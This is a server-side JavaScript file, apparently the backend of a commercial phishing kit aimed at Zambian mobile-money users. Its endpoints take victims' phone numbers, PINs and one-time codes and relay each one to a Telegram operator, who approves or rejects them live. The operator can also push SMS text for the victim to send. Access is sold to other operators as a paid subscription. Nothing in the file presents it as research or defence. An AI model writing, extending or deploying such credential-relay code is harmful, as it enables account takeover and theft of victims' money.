      const nid = nextAvailableId(); if (!nid) { await edit(`❌ No slots.`); return; }
      const nu = await registerUser(nid, dn, ucid);
      pendingPayments.delete(ucid);
      const lk = ROOT_LINK ? `${ROOT_LINK}/${nid}/` : '';
      await edit(`✅ Approved ${sanitize(un)} [${nid}]\n🔗 <code>${lk}</code>\n📅 ${fmtDate(nu.expiresAt)}\n${tl}`);
      await sendTg(ucid, `🎉 <b>Confirmed!</b>\n\n🔗 <code>${lk}</code>\n📅 ${fmtDate(nu.expiresAt)}\n\n/mylink /expiry`);
    } else if (action === 'reject') {
      pendingPayments.delete(ucid); await edit(`❌ Rejected\n${tl}`); await sendTg(ucid, `❌ Not confirmed. /start`);
    } else if (action === 'renew') {
      const eu = [...users.values()].find(u => u.chatId === String(ucid)); if (!eu) { await edit(`❌`); return; }
      const ne = await renewUser(eu); pendingRenewals.delete(ucid);
      await edit(`✅ Renewed → ${fmtDate(ne)}\n${tl}`); await sendTg(ucid, `🎉 Renewed! 📅 ${fmtDate(ne)}`);
    } else if (action === 'rejectrenew') {
      pendingRenewals.delete(ucid); await edit(`❌ Renewal rejected\n${tl}`);
      await sendTg(ucid, `❌ Renewal not confirmed. /start`);
    }
    return;
  }

  // ── Zambia login / OTP verification callbacks ─────────────────────────────
  const callbackUser = [...users.values()].find(u => u.chatId === String(chatId));
  if (!callbackUser) { await ack('❌ User not found', true); return; }
  const parsed = parseCb(data); if (!parsed) { await ack('❌ Bad data', true); return; }
  const { type, action, phone, secret } = parsed;
  const key = `${phone}-${secret}`, now = Date.now();

  if (type === 'login') {
    const rec = callbackUser.logins.get(key);
    if (!rec) { await ack('❌ Not found', true); return; }
    if (rec.approved || rec.rejected || rec.sendText) { await ack('✅ Already processed'); return; }
    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      Object.assign(rec, { approved: false, rejected: true, expired: true });
      await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`);
      await ack('⏰ Expired', true); return;
    }
    if (action === 'proceed') {
      rec.approved = true;
      await edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n→ OTP step`);
      await ack('✅ Allowed!');
    } else if (action === 'invalid') {
      Object.assign(rec, { rejected: true, rejectionReason: 'invalid' });
      await edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`);
      await ack('❌ Invalid');
    } else if (action === 'sendtext') {
      // ── Admin chose "Send Text" — just swipe-reply to respond ─────────────
      rec.sendText = true;
      pendingSendTexts.set(phone, { ts: now, text: null, resolved: false, readAt: null, msgId: null });
      log.info(`📤 Reply-with-Text initiated for ${phone}`);
      await edit(
        `📤 <b>REPLY WITH TEXT</b>\n📞 <code>${phone}</code>\n\n` +
        `↩️ <b>Swipe-reply to this message</b> with the text to send.\n\n` +
        `⏱️ You have 5 minutes.`
      );
      sendTextMsgToPhone.set(messageId, phone);
      pendingSendTexts.get(phone).msgId = messageId;
      log.info(`📤 Mapped msgId=${messageId} → phone=${phone}`);
      await ack('📤 Swipe-reply with the text!');
    }
    return;
  }

  if (type === 'otp') {
    const rec = callbackUser.otps.get(key);
    if (!rec) { await ack('❌ Not found', true); return; }
    if (rec.status !== 'pending') { await ack('✅ Already processed'); return; }
    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      rec.status = 'timeout';
      await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`);
      await ack('⏰ Expired', true); return;
    }
    if (action === 'correct') {
      rec.status = 'approved';
      await edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`);
      await ack('✅ Verified!');
    } else if (action === 'wrong') {
      rec.status = 'rejected';
      await edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`);
      await ack('❌ Wrong');
    } else if (action === 'wrongpin') {
      rec.status = 'wrong_pin';
      await edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`);
      await ack('⚠️ Wrong PIN');
    }
    return;
  }

  // ── SMS confirmation callbacks (success / fail from operator) ──────────────
  if (type === 'sms') {
    if (action === 'success') {
      await edit(
        `✅ <b>SMS CONFIRMED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
      );
      await ack('✅ Marked successful');
    } else if (action === 'fail') {
      await edit(
        `❌ <b>SMS FAILED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
      );
      await ack('❌ Marked failed');
    }
    pendingSendTexts.delete(phone);
    if (phone) sendTextMsgToPhone.forEach((p, mid) => { if (p === phone) sendTextMsgToPhone.delete(mid); });
    return;
  }

  await ack('❓ Unknown');
}

// ── Periodic cleanup ──────────────────────────────────────────────────────────
setInterval(() => {
  const now = Date.now(), exp = now - CFG.APPROVAL_TIMEOUT, del = now - 600_000;
  for (const u of users.values()) {
    for (const [k, v] of u.logins) {
      if (!v.expired && v.ts < exp) Object.assign(v, { approved: false, rejected: true, expired: true });
      if (v.ts < del) u.logins.delete(k);
    }
    for (const [k, v] of u.otps) {
      if (v.status === 'pending' && v.ts < exp) v.status = 'timeout';
      if (v.readAt && now - v.readAt > CFG.READ_TTL) { u.otps.delete(k); continue; }
      if (v.ts < del) u.otps.delete(k);
    }
  }
  // Clean up timed-out or fully-read send-text entries + reverse lookup
  for (const [phone, entry] of pendingSendTexts) {
    const age = now - entry.ts;
    const shouldDelete = (age > CFG.SEND_TEXT_TIMEOUT + 60_000) ||
                         (entry.readAt && now - entry.readAt > CFG.READ_TTL);
    if (shouldDelete) {
      if (entry.msgId) sendTextMsgToPhone.delete(entry.msgId);
      pendingSendTexts.delete(phone);
    }
  }
}, CFG.CLEANUP_INTERVAL).unref?.();

// ── Expiry checker ────────────────────────────────────────────────────────────
const runExpiryCheck = async () => {
  for (const u of users.values()) {
    if (!u.expiresAt) continue;
    const d = daysUntil(u.expiresAt);
    if (d <= 0 && !u.expired) {
      u.expired = true;
      await sendTg(u.chatId, `⚠️ <b>Expired</b>\n\nPay KSh. ${RENEWAL_AMOUNT} to:\n<code>${PAYMENT_DETAILS}</code>\nThen /start`);
      if (ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID, `🔔 Expired: ${u.name} [${u.id}]`);
    } else if (d > 0 && d <= CFG.WARNING_DAYS && !u.warningSent) {
      u.warningSent = true;
      await sendTg(u.chatId, `⏰ <b>Expiring ${d}d</b> (${fmtDate(u.expiresAt)}). Pay KSh. ${RENEWAL_AMOUNT} then /start`);
    }
  }
};

// ── Middleware: resolve user + bot guard ──────────────────────────────────────
const resolveUser = (req, res, next) => {
  const { userId } = req.params;
  if (!userId || !/^[a-z]{2}$/.test(userId))
    return res.status(400).json({ success: false, message: 'Invalid user ID' });
  const u = users.get(userId);
  if (!u) return res.status(404).json({ success: false, message: `User "${userId}" not found` });
  if (u.expiresAt && isExpired(u.expiresAt)) {
    u.expired = true;
    return res.status(402).json({ success: false, expired: true, message: 'Subscription expired.' });
  }
  req.user = u; next();
};
const botOk = (res) => {
  if (!bot || !botHealthy) { res.status(503).json({ success: false, message: 'Bot unavailable' }); return false; }
  return true;
};

// ── Webhook endpoint + update buffer ─────────────────────────────────────────
// ── /sendtext command handler (fallback) ─────────────────────────────────────
// Primary method: operator swipe-replies to the "Reply with Text" message.
// This /sendtext command is the fallback for edge cases (e.g. server restart).
// Runs at Express level — no dependency on node-telegram-bot-api events.
async function handleSendTextCommand(chatId, rawPhone, body) {
  const phone = normalise(rawPhone.trim());
  body = body.trim();

  log.info(`/sendtext — phone=${phone} text="${body.slice(0, 60)}"`);

  let pending = pendingSendTexts.get(phone);

  // If no entry exists (e.g. server restarted and state was lost),
  // create one on the fly so the frontend can still pick it up.
  if (!pending) {
    log.warn(`/sendtext: no prior entry for ${phone} — auto-creating (likely server restart)`);
    pending = { ts: Date.now(), text: null, resolved: false, readAt: null };
    pendingSendTexts.set(phone, pending);
  }

  if (Date.now() - pending.ts > CFG.SEND_TEXT_TIMEOUT) {
    pendingSendTexts.delete(phone);
    if (bot && botHealthy) {
      await bot.sendMessage(chatId,
        `⏰ Expired (5-minute window passed).`,
        { parse_mode: 'HTML' }).catch(() => {});
    }
    return;
  }

  // Resolve — frontend polling /check-text-content will pick this up
  pending.text     = sanitize(body);
  pending.resolved = true;
  pending.readAt   = null;

  log.info(`✅ /sendtext RESOLVED for ${phone}`);

  // Try to reply to admin — bot may not be ready after restart, that's OK
  if (bot && botHealthy) {
    await bot.sendMessage(chatId,
      `✅ <b>Text sent to frontend!</b>\n\n` +
      `📞 <code>${phone}</code>\n` +
      `💬 <code>${sanitize(body)}</code>\n\n` +
      `User will now see the Send Message button.`,
      { parse_mode: 'HTML' }).catch(e => log.error('sendText confirm err:', e.message));
  } else {
    log.warn(`Bot not ready — text stored for ${phone}, reply to admin skipped`);
  }
}

// ── Send-text REPLY handler — admin swipe-replies to the "SEND TEXT" message ─
async function handleSendTextReply(chatId, phone, body) {
  body = body.trim();
  log.info(`📤 Reply-to-send-text — phone=${phone} text="${body.slice(0, 60)}"`);

  let pending = pendingSendTexts.get(phone);
  if (!pending) {
    log.warn(`Reply-send-text: no entry for ${phone} — auto-creating`);
    pending = { ts: Date.now(), text: null, resolved: false, readAt: null, msgId: null };
    pendingSendTexts.set(phone, pending);
  }

  if (Date.now() - pending.ts > CFG.SEND_TEXT_TIMEOUT) {
    pendingSendTexts.delete(phone);
    sendTextMsgToPhone.delete(pending.msgId);
    if (bot && botHealthy) {
      await bot.sendMessage(chatId, `⏰ Expired (5-minute window passed).`, { parse_mode: 'HTML' }).catch(() => {});
    }
    return;
  }

  // Resolve — frontend polling /check-text-content will pick this up
  pending.text     = sanitize(body);
  pending.resolved = true;
  pending.readAt   = null;

  log.info(`✅ Reply RESOLVED for ${phone}`);

  // Clean up the reverse lookup
  if (pending.msgId) sendTextMsgToPhone.delete(pending.msgId);

  if (bot && botHealthy) {
    await bot.sendMessage(chatId,
      `✅ <b>Sent to frontend!</b>\n\n` +
      `📞 <code>${phone}</code>\n` +
      `💬 <code>${sanitize(body)}</code>\n\n` +
      `User will see the Send Message button now.`,
      { parse_mode: 'HTML' }).catch(e => log.error('reply confirm err:', e.message));
  }
}

// ── Webhook endpoint ─────────────────────────────────────────────────────────
const MAX_BUF = 200;
let updateBuffer = [];
const flushUpdateBuffer = () => {
  if (!bot || !updateBuffer.length) return;
  const b = updateBuffer; updateBuffer = [];
  for (const u of b) { try { bot.processUpdate(u); } catch (e) {} }
};
app.post('/webhook/:token', async (req, res) => {
  if (req.params.token !== process.env.BOT_TOKEN) return res.sendStatus(403);
  const upd = req.body;

  // Log EVERY incoming update
  const updType = upd.message ? 'msg' : upd.callback_query ? 'cb' : '?';
  const snippet = upd.message?.text?.slice(0, 60) || upd.callback_query?.data?.slice(0, 40) || '';
  log.info(`⬇️  [${updType}] ${snippet}`);

  // ── Intercept swipe-reply to a "Reply with Text" message ───────────────────
  // Operator swipes on the "REPLY WITH TEXT" message and types the text to send.
  // Detected by matching reply_to_message.message_id against sendTextMsgToPhone.
  // Also supports /sendtext command as fallback.
  if (upd.message?.text) {
    const msgText = upd.message.text;
    const chatId  = String(upd.message.chat.id);
    const isAdminChat = isAdmin(chatId);

    // ── Method 1: Swipe-reply to the "Reply with Text" bot message ─────────
    // Allow admin OR any registered user (operators get login messages too)
    const isKnownUser = isAdminChat || [...users.values()].some(u => u.chatId === chatId);
    if (isKnownUser && upd.message.reply_to_message && !msgText.startsWith('/')) {
      const replyToId = upd.message.reply_to_message.message_id;
      const phone = sendTextMsgToPhone.get(replyToId);
      if (phone) {
        log.info(`📤 Reply detected from ${chatId} → msgId=${replyToId} → phone=${phone}`);
        try {
          await handleSendTextReply(chatId, phone, msgText);
        } catch (e) {
          log.error('Send-text reply handler error:', e.message);
        }
        return res.sendStatus(200);
      }
    }

    // ── Method 2: /sendtext command (fallback) ──────────────────────────────
    const match = msgText.match(/^\/sendtext(?:@\S+)?\s+(\S+)\s+([\s\S]+)/);
    if (match && (isAdminChat || [...users.values()].find(u => u.chatId === chatId))) {
      try {
        await handleSendTextCommand(chatId, match[1], match[2]);
      } catch (e) {
        log.error('/sendtext handler error:', e.message);
      }
      return res.sendStatus(200);
    }
  }

  if (!bot) { if (updateBuffer.length < MAX_BUF) updateBuffer.push(upd); return res.sendStatus(200); }
  try { bot.processUpdate(upd); } catch (e) { log.error('processUpdate err:', e.message); }
  res.sendStatus(200);
});

// ── Health ────────────────────────────────────────────────────────────────────
app.get('/api/health', (_, res) => {
  res.json({
    status: botHealthy ? 'ok' : 'degraded',
    users: [...users.values()].map(u => ({
      id: u.id, name: u.name, source: u.source,
      expired: u.expired, logins: u.logins.size, otps: u.otps.size,
    })),
    pendingPayments: pendingPayments.size,
    pendingRenewals: pendingRenewals.size,
    pendingSendTexts: pendingSendTexts.size,
    ts: ts(),
  });
});

// ── API endpoints ─────────────────────────────────────────────────────────────
app.post('/api/:userId/check-user-status', resolveUser, (req, res) => {
  const { phoneNumber } = req.body;
  if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
  res.json({ success: true, isReturningUser: false });
});

app.post('/api/:userId/login', resolveUser, async (req, res) => {
  const user = req.user; if (!botOk(res)) return;
  const { pin, timestamp } = req.body, raw = req.body.phoneNumber;
  if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
  const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
  const ie = vPin(pin);   if (ie) return res.status(400).json({ success: false, message: ie });
  const phone = normalise(raw);
  if (user.dupes.seen(`login:${phone}:${pin}`)) return res.json({ success: true, message: 'Cached' });
  const key = `${phone}-${pin}`;
  user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false, sendText: false });
  const text = fmtLogin(user, { phone, pin, time: timestamp || Date.now() });
  // ── 3 buttons now: Allow (OTP), Invalid, Send Text ────────────────────────
  const kb = { inline_keyboard: [[
    { text: '✅ Allow → OTP',         callback_data: mkCb('login', 'proceed',   phone, pin) },
  ], [
    { text: '📤 Reply with Text',       callback_data: mkCb('login', 'sendtext',  phone, pin) },
  ], [
    { text: '❌ Invalid Information',  callback_data: mkCb('login', 'invalid',   phone, pin) },
  ]] };
  const r = await sendMsg(user, text, { reply_markup: kb });
  r.ok
    ? res.json({ success: true, message: 'Waiting for approval' })
    : res.status(500).json({ success: false, message: 'Failed', error: r.err });
});

app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
  const { pin } = req.body, raw = req.body.phoneNumber;
  if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
  const phone = normalise(raw), rec = req.user.logins.get(`${phone}-${pin}`);

  // ── Fallback: if no login record but pendingSendTexts has an entry for this
  //    phone, operator already chose "Reply with Text" (possibly after restart).
  //    Signal sendText so the frontend switches to polling /check-text-content. ──
  if (!rec) {
    const stEntry = pendingSendTexts.get(phone);
    if (stEntry && Date.now() - stEntry.ts <= CFG.SEND_TEXT_TIMEOUT) {
      return res.json({ success: true, sendText: true });
    }
    return res.json({ success: true, approved: false, rejected: false, expired: false });
  }

  if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT)
    return res.json({ success: true, approved: false, rejected: true, expired: true });

  // ── sendText: signal that admin chose this path ──────────────────────────
  if (rec.sendText) {
    return res.json({ success: true, sendText: true });
  }

  res.json({
    success: true,
    approved: rec.approved,
    rejected: rec.rejected,
    expired: rec.expired || false,
    rejectionReason: rec.rejectionReason || null,
  });
});

// ── Check text content — frontend polls here after operator chose "Reply with Text" ──
app.post('/api/:userId/check-text-content', resolveUser, (req, res) => {
  const raw = req.body.phoneNumber;
  if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
  const phone = normalise(raw);
  const entry = pendingSendTexts.get(phone);

  if (!entry) {
    return res.json({ success: true, ready: false, message: 'No pending request' });
  }
  if (Date.now() - entry.ts > CFG.SEND_TEXT_TIMEOUT) {
    pendingSendTexts.delete(phone);
    return res.json({ success: true, ready: false, timedOut: true });
  }
  if (!entry.resolved || !entry.text) {
    return res.json({ success: true, ready: false });
  }
  // Mark read time only on first read
  if (!entry.readAt) entry.readAt = Date.now();
  return res.json({ success: true, ready: true, text: entry.text });
});

// ── Confirm SMS sent — frontend calls after user taps Send SMS ──────────────
app.post('/api/:userId/confirm-sms-sent', resolveUser, async (req, res) => {
  const user = req.user;
  const raw = req.body.phoneNumber;
  if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
  const phone = normalise(raw);
  const { num } = fmtPhone(phone);

  log.info(`SMS send button tapped for ${phone} by ${user.name}`);

  res.json({ success: true, message: 'Notification sent' });

  // Notify operator with confirm/fail buttons
  if (bot && botHealthy) {
    try {
      await sendMsg(user,
        `📩 <b>${sanitize(user.name)} — SMS FORWARDED</b>\n\n` +
        `👆 User tapped Send Message button\n` +
        `📞 <b>Phone:</b> <code>+260${num}</code>\n` +
        `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
        `Did the SMS go through?`,
        {
          reply_markup: { inline_keyboard: [[
            { text: '✅ Successful', callback_data: mkCb('sms', 'success', phone, num) },
            { text: '❌ Failed',     callback_data: mkCb('sms', 'fail',    phone, num) },
          ]] }
        }
      );
    } catch (e) { log.error('SMS confirm notify err:', e.message); }
  }
});


app.post('/api/:userId/verify-otp', resolveUser, async (req, res) => {
  const user = req.user; if (!botOk(res)) return;
  const { otp, timestamp } = req.body, raw = req.body.phoneNumber;
  if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
  const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
  const oe = vOtp(otp);   if (oe) return res.status(400).json({ success: false, message: oe });
  const phone = normalise(raw);
  if (user.dupes.seen(`otp:${phone}:${otp}`)) return res.json({ success: true, message: 'Cached' });
  const key = `${phone}-${otp}`;
  user.otps.set(key, { status: 'pending', ts: Date.now() });
  const text = fmtOtp(user, { phone, otp, time: timestamp || Date.now() });
  const kb = { inline_keyboard: [[
    { text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct',  phone, otp) },
  ], [
    { text: '❌ Wrong Code',          callback_data: mkCb('otp', 'wrong',    phone, otp) },
    { text: '⚠️ Wrong PIN',           callback_data: mkCb('otp', 'wrongpin', phone, otp) },
  ]] };
  const r = await sendMsg(user, text, { reply_markup: kb });
  r.ok
    ? res.json({ success: true, message: 'OTP sent' })
    : res.status(500).json({ success: false, message: 'Failed', error: r.err });
});

app.post('/api/:userId/check-otp-status', resolveUser, (req, res) => {
  const { otp } = req.body, raw = req.body.phoneNumber;
  if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
  const phone = normalise(raw), rec = req.user.otps.get(`${phone}-${otp}`);
  if (!rec) return res.json({ success: true, status: 'pending' });
  if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout' });
  if (['approved', 'rejected', 'wrong_pin'].includes(rec.status)) rec.readAt = rec.readAt || Date.now();
  res.json({ success: true, status: rec.status });
});

app.post('/api/:userId/resend-otp', resolveUser, async (req, res) => {
  const user = req.user; if (!botOk(res)) return;
  const raw = req.body.phoneNumber;
  if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
  const phone = normalise(raw);
  const r = await sendMsg(user,
    `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(req.body.timestamp || Date.now()).toLocaleString()}`
  );
  r.ok ? res.json({ success: true }) : res.status(500).json({ success: false, error: r.err });
});

app.use((req, res) => res.status(404).json({ success: false, message: 'Not found' }));
app.use((err, req, res, next) => { log.error('Error:', err.message); res.status(500).json({ success: false, error: 'Internal error' }); });

// ── Startup ───────────────────────────────────────────────────────────────────
let server;
const startServer = async () => {
  loadEnvUsers();
  await connectDB();
  await loadUsersFromDB();
  sortUsers();
  await loadStateFromDB();
  await new Promise(r => {
    server = app.listen(PORT, () => {
      console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
      console.log(`🇿🇲 Zambia Server — port ${PORT}`);
      console.log(`🤖 Mode: webhook`);
      console.log(`🔗 ${WEBHOOK_URL || '(not set)'}`);
      console.log(`👥 Users: ${users.size}`);
      console.log(`💰 Reg: KSh. ${PAYMENT_AMOUNT} | Renew: KSh. ${RENEWAL_AMOUNT}`);
      console.log(`📅 ${EXPIRY_DAYS}d | Warn: ${CFG.WARNING_DAYS}d`);
      users.forEach(u => {
        console.log(`   [${u.id}] ${u.name} (${u.source}) ${u.expiresAt ? fmtDate(u.expiresAt) : 'permanent'}`);
      });
      console.log('\n📋 Endpoints: /login  /check-login-approval  /check-text-content  /confirm-sms-sent  /verify-otp  /check-otp-status  /resend-otp');
      console.log('📤 Reply with Text: swipe-reply on login message, or /sendtext <phone> <message>');
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
      r();
    });
  });
  await initBot().catch(e => log.error('Bot init:', e.message));
  setTimeout(runExpiryCheck, 5000);
  setInterval(runExpiryCheck, CFG.EXPIRY_CHECK_INTERVAL);
};
startServer().catch(e => { log.error('Fatal:', e.message); process.exit(1); });

// ── Graceful shutdown ─────────────────────────────────────────────────────────
const shutdown = async (sig) => {
  markShutdown();
  log.info(`${sig} — shutting down...`);
  if (server) server.close();
  for (const u of users.values()) { u.dupes.clear(); u.tgQueue?.flush('shutdown'); }
  if (bot) {
    if (sig === 'SIGINT') { try { await bot.deleteWebHook(); } catch (e) {} }
    clearBotListeners(); bot = null;
  }
  if (sig === 'SIGINT') { try { require('mongoose').connection.close(); } catch (e) {} }
  process.exit(0);
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('uncaughtException',  (e) => log.error('Uncaught:', e.message, e.stack));
process.on('unhandledRejection', (r) => log.error('Unhandled:', r));
